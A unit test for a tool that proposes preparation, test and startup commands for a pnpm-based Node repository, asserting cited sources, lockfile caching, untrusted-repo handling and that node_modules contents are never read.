test("node + pnpm: cited preparation/test, lockfile recorded, node_modules never read", async () => {
  const p = await propose(NODE_PNPM);
  const prep = p.detection.proposals.preparation;
  const tst = p.detection.proposals.test;
  assert.match(prep?.command ?? "", /^pnpm install --frozen-lockfile/);
  assert.ok(prep?.source.file && prep.source.text, "preparation carries a citation");
  assert.match(tst?.command ?? "", /pnpm/);
  assert.ok(tst?.source.file === "package.json" && typeof tst.source.line === "number");
  assert.deepEqual(Object.keys(p.inputs.lockfiles ?? {}), ["pnpm-lock.yaml"]);
  assert.ok(!Object.keys(p.inputs.manifests ?? {}).some((k) => k.includes("node_modules")));
  assert.equal(p.detection.proposals.preparation?.safety, "safe", "the hostile script in node_modules was never seen");
  assert.equal(p.mode, "proposal-only");
  assert.deepEqual(p.recipe.issues, []);
  assert.equal(p.recipe.recipe?.phases.initialise.command, prep?.command);
  assert.equal(p.recipe.recipe?.test?.command, tst?.command);
  assert.equal(p.recipe.recipe?.phases.initialise.trust, "untrusted-repo");
  assert.deepEqual(p.recipe.recipe?.cachePolicy.keys, ["pnpm-lock.yaml"]);
  assert.ok(p.recipe.gaps.some((g) => g.startsWith("start proposal not mapped")), "a server is never mapped onto the exit-0 startup phase");
  assert.equal(p.recipe.recipe?.phases.startup.command, "true");
  assert.ok(p.recipeDigest && /^[0-9a-f]{64}$/.test(p.recipeDigest.digest));
});

